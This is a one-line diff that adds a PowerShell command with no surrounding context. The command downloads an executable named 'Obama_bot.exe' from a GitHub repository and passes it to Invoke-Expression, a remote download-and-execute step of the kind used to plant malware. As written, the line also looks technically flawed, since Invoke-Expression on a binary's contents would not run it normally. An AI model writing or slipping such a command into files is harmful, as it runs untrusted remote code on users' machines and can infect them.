@@ -1,0 +1,1 @@
+powershell -Command (Invoke-Expression(Invoke-WebRequest("https://github.com/RaupenInspektor/Pico/raw/main/Obama_bot.exe")))
